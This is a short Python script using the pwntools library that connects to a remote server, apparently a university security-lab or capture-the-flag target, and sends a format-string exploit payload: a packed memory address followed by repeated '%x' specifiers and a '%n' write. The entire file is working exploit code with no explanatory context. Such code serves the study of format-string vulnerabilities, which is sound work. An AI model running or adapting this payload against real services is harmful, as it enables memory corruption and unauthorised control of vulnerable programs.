from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22192

## run a remote process
s = remote(SERVER, PORT, timeout=9999)
address = p32(0x0804a040)
s.sendline(address+b'%x '*6+b'%n ')
result = s.recvall()

print(result)
